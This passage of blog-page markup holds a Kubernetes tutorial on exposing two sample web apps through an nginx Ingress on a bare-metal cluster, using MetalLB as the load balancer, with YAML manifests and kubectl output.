class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">4n6nk8s-gym</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">gym</span></span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">gym</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">gym-app</span></span><br><span class=\"line\">        <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-gym</span></span><br><span class=\"line\">        <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">gym-svc</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">gym</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">ClusterIP</span></span><br><span class=\"line\">  <span class=\"attr\">ports:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\">    <span class=\"attr\">port:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>Create the deployment and service of the gym app</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f gym-deployment.yaml</span><br><span class=\"line\">deployment.apps/4n6nk8s-gym created</span><br><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f gym-svc.yaml</span><br><span class=\"line\">service/gym-svc created</span><br></pre></td></tr></table></figure>\n<p>The manifest of the restaurant app and the service:</p>\n<figure class=\"highlight yaml\"><figcaption><span>Restaurant App Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">4n6nk8s-kitchen</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">kitchen-app</span></span><br><span class=\"line\">        <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-kitchen</span></span><br><span class=\"line\">        <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">kitchen-svc</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">ClusterIP</span></span><br><span class=\"line\">  <span class=\"attr\">ports:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\">    <span class=\"attr\">port:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>Create the restaurant deployment and the service:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f kitchen-deployment.yaml</span><br><span class=\"line\">deployment.apps/4n6nk8s-kitchen created</span><br><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f kitchen-svc.yaml</span><br><span class=\"line\">service/kitchen-svc created</span><br></pre></td></tr></table></figure>\n<p>Check the deployments and the services! :</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all</span><br><span class=\"line\">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">pod/4n6nk8s-gym-698f44db99-29dnr       1/1     Running   0          63s</span><br><span class=\"line\">pod/4n6nk8s-kitchen-6b56959b86-n7c9z   1/1     Running   0          46s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE</span><br><span class=\"line\">service/gym-svc             ClusterIP   10.110.191.206   &lt;none&gt;        80/TCP     53s</span><br><span class=\"line\">service/kitchen-svc         ClusterIP   10.102.94.94     &lt;none&gt;        80/TCP     39s</span><br><span class=\"line\">service/kubernetes          ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    3d14h</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                              READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class=\"line\">deployment.apps/4n6nk8s-gym       1/1     1            1           63s</span><br><span class=\"line\">deployment.apps/4n6nk8s-kitchen   1/1     1            1           46s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                         DESIRED   CURRENT   READY   AGE</span><br><span class=\"line\">replicaset.apps/4n6nk8s-gym-698f44db99       1         1         1       63s</span><br><span class=\"line\">replicaset.apps/4n6nk8s-kitchen-6b56959b86   1         1         1       46s</span><br></pre></td></tr></table></figure>\n<p>Let’s now create the ingress manifest:</p>\n<figure class=\"highlight yaml\"><figcaption><span>Ingress YAML Definition</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">networking.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Ingress</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">annotations:</span></span><br><span class=\"line\">    <span class=\"attr\">nginx.ingress.kubernetes.io/rewrite-target:</span> <span class=\"string\">/</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">ingress-4n6nk8s</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">ingressClassName:</span> <span class=\"string\">nginx</span></span><br><span class=\"line\">  <span class=\"attr\">rules:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">host:</span> <span class=\"string\">justk8s.k8s</span></span><br><span class=\"line\">    <span class=\"attr\">http:</span></span><br><span class=\"line\">      <span class=\"attr\">paths:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">path:</span> <span class=\"string\">/kitchen</span></span><br><span class=\"line\">        <span class=\"attr\">pathType:</span> <span class=\"string\">Prefix</span></span><br><span class=\"line\">        <span class=\"attr\">backend:</span></span><br><span class=\"line\">          <span class=\"attr\">service:</span></span><br><span class=\"line\">            <span class=\"attr\">name:</span> <span class=\"string\">kitchen-svc</span></span><br><span class=\"line\">            <span class=\"attr\">port:</span></span><br><span class=\"line\">              <span class=\"attr\">number:</span> <span class=\"number\">80</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">path:</span> <span class=\"string\">/gym</span></span><br><span class=\"line\">        <span class=\"attr\">pathType:</span> <span class=\"string\">Prefix</span></span><br><span class=\"line\">        <span class=\"attr\">backend:</span></span><br><span class=\"line\">          <span class=\"attr\">service:</span></span><br><span class=\"line\">            <span class=\"attr\">name:</span> <span class=\"string\">gym-svc</span></span><br><span class=\"line\">            <span class=\"attr\">port:</span></span><br><span class=\"line\">              <span class=\"attr\">number:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>The  <code>ingressClassName</code>  must be “nginx” since we have nginx ingress controller. The  <code>host</code>  field in the  <code>rules</code>  define the domain name of the request. So if a HTTP request come to the cluster with the host name  <code>justk8s.k8s</code>  this rull will be applied!<br>\nThe the  <code>path</code>  int the  <code>paths</code>  will be the route ! The ingress give you the service in this route!<br>\nIn our Example if we enter  <code>http://justk8s.k8s/kitchen</code>  the ingress will forward the restaurant app!<br>\nin the  <code>path</code>  field we specify the  <code>service</code>  name and the  <code>port number</code></p>\n<p>Now Let’s Create the ingress object</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f ingress.yaml</span><br><span class=\"line\">ingress.networking.k8s.io/ingress-4n6nk8s created</span><br></pre></td></tr></table></figure>\n<p>Check the ingerss object !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get ingress</span><br><span class=\"line\">NAME              CLASS   HOSTS         ADDRESS   PORTS   AGE</span><br><span class=\"line\">ingress-4n6nk8s   nginx   justk8s.k8s             80      5s</span><br></pre></td></tr></table></figure>\n<p>Display more details about the ingress object with  <code>kubectl describe ingress</code> :</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl describe ingress ingress-4n6nk8s</span><br><span class=\"line\">Name:             ingress-4n6nk8s</span><br><span class=\"line\">Labels:           &lt;none&gt;</span><br><span class=\"line\">Namespace:        default</span><br><span class=\"line\">Address:          192.168.1.240</span><br><span class=\"line\">Default backend:  default-http-backend:80 (&lt;error: endpoints <span class=\"string\">&quot;default-http-backend&quot;</span> not found&gt;)</span><br><span class=\"line\">Rules:</span><br><span class=\"line\">  Host         Path  Backends</span><br><span class=\"line\">  ----         ----  --------</span><br><span class=\"line\">  justk8s.k8s</span><br><span class=\"line\">               /kitchen   kitchen-svc:80 (10.1.235.141:80)</span><br><span class=\"line\">               /gym       gym-svc:80 (10.1.235.147:80)</span><br><span class=\"line\">Annotations:   nginx.ingress.kubernetes.io/rewrite-target: /</span><br><span class=\"line\">Events:</span><br><span class=\"line\">  Type    Reason  Age               From                      Message</span><br><span class=\"line\">  ----    ------  ----              ----                      -------</span><br><span class=\"line\">  Normal  Sync    7s (x2 over 19s)  nginx-ingress-controller  Scheduled <span class=\"keyword\">for</span> <span class=\"built_in\">sync</span></span><br></pre></td></tr></table></figure>\n<p>We see that the Default backend display  <code>(&lt;error: endpoints &quot;default-http-backend&quot; not found&gt;)</code> .<br>\nThis error occur because we don’t specify a default backend (route) so when you enter  <code>http://justk8s.k8s/</code>  we will find the nginx 404 not found page !</p>\n<h1 id=\"check-the-deployments\"><a class=\"markdownIt-Anchor\" href=\"#check-the-deployments\">#</a> Check the Deployments!</h1>\n<p>After Installing the LoadBalancer and Ingress Controller. Let’s try to access to our 2 apps. But before access to this apps let’s create an  <code>/etc/hosts</code>  entry ( <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code>  for Windows):</p>\n<figure class=\"highlight bash\"><figcaption><span>/etc/hosts</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.1.240 justk8s.k8s <span class=\"comment\"># The IP address of the Load Balancer of the Ingress Controller !</span></span><br></pre></td></tr></table></figure>\n<p>Now Let’s go to our browser! I add this entry in my master node! So I can access to these apps from my master node !:</p>\n<p><img data-src=\"https://imgur.com/p4sAzQX.png\" alt=\"\"><br>\n<img data-src=\"https://imgur.com/tauie6V.png\" alt=\"\"></p>\n<p>Bingo! Everything is Ok !</p>\n","site":{"data":{}},"length":13170,"excerpt":"","more":"<h1 id=\"ingress-in-bare-metal-kubernetes-cluster\"><a class=\"markdownIt-Anchor\" href=\"#ingress-in-bare-metal-kubernetes-cluster\">#</a> Ingress in bare metal Kubernetes cluster</h1>\n<p>You are working in enterprise that have one cluster with one public IP address and one Domain Name. In our Example  <code>justk8s.k8s</code> .<br>\nThat Enterprise want to deploy two web apps for these new service (gym and restaurant) with that single cluster,IP and Domain Name !!<br>\nYour task is to deploy these two apps! So you decide to use  <code>Ingress</code>  because it’s the best solution for this kind of problems!</p>\n<h2 id=\"what-is-ingress\"><a class=\"markdownIt-Anchor\" href=\"#what-is-ingress\">#</a> What is Ingress</h2>\n<p>Kubernetes Ingress is an API object that provides routing rules to manage external users’ access to the services in a Kubernetes cluster, typically via HTTPS/HTTP. With Ingress, you can easily set up rules for routing traffic without creating a bunch of Load Balancers or exposing each service on the node<br>\n<img data-src=\"https://imgur.com/rXoZYym.png\" alt=\"\"></p>\n<h2 id=\"ingress-controller\"><a class=\"markdownIt-Anchor\" href=\"#ingress-controller\">#</a> Ingress Controller</h2>\n<p>An Ingress Controller is a Kubernetes controller that is deployed manually to the cluster, most often as a DaemonSet or a Deployment object that runs dedicated Pods for handling incoming traffic load balancing and smart routing. It is responsible for processing the Ingress objects (which specify that they especially want to use the Ingress Controller) and dynamically configuring real routing rules<br>\nThe most common used Ingress controllerfor Kubernetes is  <code>Ingress Nginx</code> <br>\n<img data-src=\"https://imgur.com/P0IubVc.png\" alt=\"\"></p>\n<h2 id=\"ingress-in-cloud-vs-ingress-in-bare-metal-cluster\"><a class=\"markdownIt-Anchor\" href=\"#ingress-in-cloud-vs-ingress-in-bare-metal-cluster\">#</a> Ingress in cloud Vs Ingress in bare metal cluster</h2>\n<p>Deploying Ingress pn managed Kubernetes cluster provided in cloud easier than in bare metal cluster. Because the Ingress Controller must be exposed as LoadBlancer!</p>\n<p>In traditional cloud environments, where network load balancers are available on-demand, a single Kubernetes manifest suffices to provide a single point of contact to the NGINX Ingress controller to external clients and, indirectly, to any application running inside the cluster.</p>\n<p><img data-src=\"https://imgur.com/JM86JeT.png\" alt=\"\"></p>\n<p>Bare-metal environments lack this commodity, requiring a slightly different setup to offer the same kind of access to external consumers. So we need an aproach to solve this problem !</p>\n<p><img data-src=\"https://imgur.com/MaTmKew.png\" alt=\"\"></p>\n<h1 id=\"create-load-balancer-proxy-for-bare-metal-cluster\"><a class=\"markdownIt-Anchor\" href=\"#create-load-balancer-proxy-for-bare-metal-cluster\">#</a> Create Load Balancer / Proxy for bare metal cluster</h1>\n<p>There is a lot of method to set up a Load Balancer or Proxy to get Ingress work on our cluster.</p>\n<ul>\n<li>We can expose our ingress controller using NodePort service and set up a proxy that forward to this service using a nginx proxy or HA proxy</li>\n<li>We can also install a software solution called  <code>metalLB</code> . This solution allows to create Load Balancer in local cluster without any problem ! So we can expose our ingress controller using Load Balancer service like in the cloud environment!</li>\n</ul>\n<h2 id=\"create-load-balancer-using-metallb\"><a class=\"markdownIt-Anchor\" href=\"#create-load-balancer-using-metallb\">#</a> Create Load Balancer using metalLB:</h2>\n<p>In this demo we will deploy one of the 2 apps and expose it with Load Balancer service for the test purposes. So Let’s start deploying the restaurant app and expose it !</p>\n<figure class=\"highlight yaml\"><figcaption><span>Restaurant App Deployment</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">4n6nk8s-kitchen</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">kitchen</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">kitchen-app</span></span><br><span class=\"line\">        <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-kitchen</span></span><br><span class=\"line\">        <span class=\"attr\">ports:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">containerPort:</span> <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n<p>Create the gym app deployment</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl apply -f kitchen-deployment.yaml</span><br><span class=\"line\">deployment.apps/4n6nk8s-kitchen created</span><br><span class=\"line\"></span><br><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all</span><br><span class=\"line\">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">pod/4n6nk8s-kitchen-698f44db99-29dnr   1/1     Running   0          63s</span><br></pre></td></tr></table></figure>\n<p>Let’s now expose now the deployment:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl expose deploy/4n6nk8s-kitchen--type=LoadBalacner --port=80</span><br><span class=\"line\">service/4n6nk8s-kitchen created</span><br></pre></td></tr></table></figure>\n<p>Let’s check this service</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get svc</span><br><span class=\"line\">NAME              TYPE           CLUSTER-IP       EXTERNAL-IP     PORT(S)        AGE</span><br><span class=\"line\">4n6nk8s-kitchen   LoadBalancer   10.97.71.78      &lt;pending&gt;       80:30918/TCP   21s</span><br><span class=\"line\">kubernetes        ClusterIP      10.96.0.1        &lt;none&gt;          443/TCP        5d11h</span><br></pre></td></tr></table></figure>\n<p>As we see the LoadBalancer service still pending since we don’t have any Load Balancer! Now it’s time to talk about the metalLB !</p>\n<p>MetalLB provides a network load-balancer implementation for Kubernetes clusters that do not run on a supported cloud provider, effectively allowing the usage of LoadBalancer Services within any cluster.<br>\n<img data-src=\"https://imgur.com/Xv7PiiK.png\" alt=\"\"></p>\n<p>It’s time to install metalLB. Installing metalLB is so easy we just need to apply two manifest from the official site of <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZXRhbGxiLnVuaXZlcnNlLnRmL2luc3RhbGxhdGlvbi8=\">metalLB</span></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.12.1/manifests/namespace.yaml</span><br><span class=\"line\">kubectl apply -f https://raw.githubusercontent.com/metallb/metallb/v0.12.1/manifests/metallb.yaml</span><br></pre></td></tr></table></figure>\n<p>After running the previous commands, a new namespace will be created with a deployment, daesmonset and lot of RBAC authorization and rules!. So let’s check this namespace!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf²@4n6nk8s-master$ kubectl get all -n metallb-system</span><br><span class=\"line\">NAME                              READY   STATUS    RESTARTS       AGE</span><br><span class=\"line\">pod/controller-7cf77c64fb-4b8sx   1/1     Running   0              23s</span><br><span class=\"line\">pod/speaker-chh2t                 1/1     Running   0              23s</span><br><span class=\"line\">pod/speaker-xbn8z                 1/1     Running   0              23s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                     DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR            AGE</span><br><span class=\"line\">daemonset.apps/speaker   2         2         2       2            2           kubernetes.io/os=linux   23s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                         READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class=\"line\">deployment.apps/controller   1/1     1            1           23s</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                                    DESIRED   CURRENT   READY   AGE</span><br><span class=\"line\">replicaset.apps/controller-7cf77c64fb   1         1         1       23s</span><br></pre></td></tr></table></figure>\n<h2 id=\"configure-the-address-pool-of-the-load-balancer\"><a class=\"markdownIt-Anchor\" href=\"#configure-the-address-pool-of-the-load-balancer\">#</a> Configure the address pool of the Load Balancer</h2>\n<p>Now we must configure the  <code>metalLB</code>  using configmap object. In this configmap we give the address pool that will be used as LoadBalancer IP! Also the type of the Load Balancer.</p>\n<blockquote>\n<p>metalLB supports two LoadBalancing modes : Layer 2 mode and BGP mode. In our case we will use the Layer 2 mode</p>\n</blockquote>\n<p>Now Let’s move to the configmap manifest!</p>\n<figure class=\"highlight yaml\"><figcaption><span>Configmap</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ConfigMap</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">metallb-system</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">config</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"attr\">config:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">    address-pools:</span></span><br><span class=\"line\"><span class=\"string\">    - name: default</span></span><br><span class=\"line\"><span class=\"string\">      protocol: layer2</span></span><br><span class=\"line\"><span class=\"string\">      addresses:</span></span><br><span class=\"line\"><span class=\"string\">      - 192.168.1.240-192.168.1.250</span></span><br></pre></td></tr></table></figure>\n<p>After Applying this recent configmap. we can say that the metalLB 